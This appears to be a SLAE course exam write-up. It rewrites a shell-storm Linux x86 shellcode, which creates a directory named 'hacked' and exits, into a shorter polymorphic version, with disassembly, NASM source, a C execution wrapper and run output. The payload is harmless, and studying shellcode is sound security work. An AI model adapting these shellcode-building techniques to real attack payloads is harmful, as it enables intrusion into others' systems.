# Mkdir

<p style="text-align: justify;">Address of the original shellcode:</p>
- [http://shell-storm.org/shellcode/files/shellcode-542.php](http://shell-storm.org/shellcode/files/shellcode-542.php)

Original source code:
```c


The comment in that file is not correct.. I cut and pasted the shell code
in an existing c source and forgot to adjust it..

/*
 * This shellcode will do a mkdir() of 'hacked' and then an exit()
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed"
        "\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68"
        "\x61\x63\x6b\x65\x64\x23";


void main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```
To illustrate the appearance of the NASM code of the above shellcode, we will use the ndisaasm command.
```nasm
$ echo -ne "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23" | ndisasm -u -

00000000  EB16              jmp short 0x18
00000002  5E                pop esi
00000003  31C0              xor eax,eax
00000005  884606            mov [esi+0x6],al
00000008  B027              mov al,0x27
0000000A  8D1E              lea ebx,[esi]
0000000C  66B9ED01          mov cx,0x1ed
00000010  CD80              int 0x80
00000012  B001              mov al,0x1
00000014  31DB              xor ebx,ebx
00000016  CD80              int 0x80
00000018  E8E5FFFFFF        call dword 0x2
0000001D  6861636B65        push dword 0x656b6361
00000022  64                fs
00000023  23                db 0x23
```
<p style="text-align: justify;">I will try to present my polymorphic shellcode in parts (and finally the whole) in order to explain in detail the changes and improvements I have made.</p>

### sys_mkdir()

Original code:
```nasm
00000000  EB16              jmp short 0x18
00000002  5E                pop esi
00000003  31C0              xor eax,eax
00000005  884606            mov [esi+0x6],al
00000008  B027              mov al,0x27
0000000A  8D1E              lea ebx,[esi]
0000000C  66B9ED01          mov cx,0x1ed
00000010  CD80              int 0x80
[..]
00000018  E8E5FFFFFF        call dword 0x2        <--- Everything from here means "Push 'hacked#' on top of the stack
0000001D  6861636B65        push dword 0x656b6361
00000022  64                fs
00000023  23                db 0x23
```
Code after changes:
```nasm
	xor eax, eax        ; Clear the EAX register
	add al, 0x27        ; EAX contains the mkdir () system call identifier
	push edi            ; string terminator
	push word 0x6465    ; 'ed' in reverse
	push 0x6b636168     ; 'hack' in reverse
	mov ebx, esp        ; The ECX register contains the address of the arguments on the stack
	mov cx, 0x1ed	    ; file mode, hex(1ed) = dec(493) = oct(755)
	int 0x80            ; Execute system call
```
<p style="text-align: justify;">As we can see, I gave up the JMP-CALL-POP technique in favor of placing a string with the name of the created folder on the stack with a null being a string terminator. This trick allowed to save up to 8 bytes!
</p>

### sys_exit()

Original code:
```nasm
00000012  B001              mov al,0x1
00000014  31DB              xor ebx,ebx
00000016  CD80              int 0x80
```
Code after changes:
```nasm
  	add al,0x1          ; EAX = 0, so let's make it 1
	xor ebx, ebx        ; EBX should be 0
	int 0x80            ; Execute exit() syscall
```
<p style="text-align: justify;">Only one line has been changed - the ADD instruction was used instead of the MOV instruction.
</p>

### Full code after changes

```nasm
; Filename: 	mkdir.nasm
; Author:   	Jakub Heba
; Purpose:	  SLAE Course & Exam

global _start			

section .text
_start:
	xor eax, eax        ; Clear the EAX register
	add al, 0x27        ; EAX contains the mkdir () system call identifier
	push edi            ; string terminator
	push word 0x6465    ; 'ed' in reverse
	push 0x6b636168     ; 'hack' in reverse
	mov ebx, esp        ; The ECX register contains the address of the arguments on the stack
	mov cx, 0x1ed	      ; file mode, hex(1ed) = dec(493) = oct(755)
	int 0x80            ; Execute system call
	add al,0x1          ; EAX = 0, so let's make it 1
	xor ebx, ebx        ; EBX should be 0
	int 0x80            ; Execute exit() syscall
```

### Compiling and Execution

```sh
$ ./compile.sh mkdir
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
"\x31\xc0\x04\x27\x57\x66\x68\x65\x64\x68\x68\x61\x63\x6b\x89\xe3\x66\xb9\xed\x01\xcd\x80\x04\x01\x31\xdb\xcd\x80"
```
<p style="text-align: justify;">Shellcode.c wrapper file content:</p>

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x04\x27\x57\x66\x68\x65\x64\x68\x68\x61\x63\x6b\x89\xe3\x66\xb9\xed\x01\xcd\x80\x04\x01\x31\xdb\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Execution:
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ls
compile.sh  shellcode  shellcode.c  template  template.nasm  template.o

$ ./shellcode 
Shellcode Length:  28

$ ls -la
total 44
drwxrwxr-x 3 slae slae 4096 Mar 30 12:45 .
drwxrwxr-x 5 slae slae 4096 Mar 25 05:33 ..
-rwxrwxr-x 1 slae slae  310 Mar 25 13:41 compile.sh
-rw------- 1 slae slae  710 Mar 25 16:00 .gdb_history
drwxr-xr-x 2 root root 4096 Mar 30 12:45 hacked           <------
-rwxr-xr-x 1 root root 7462 Mar 30 12:44 shellcode
-rw-rw-r-- 1 slae slae  287 Mar 30 12:43 shellcode.c
-rwxr-xr-x 1 root root  534 Mar 30 12:43 template
-rw-rw-r-- 1 slae slae  232 Mar 25 16:05 template.nasm
-rw-rw-r-- 1 slae slae  448 Mar 30 12:43 template.o
```

### Summary

Original shellcode length:

- **36 bytes**

Length of polymorphic shellcode:

- **28 bytes**

Difference in length:

- **~22% shorter!**

### Pwned.
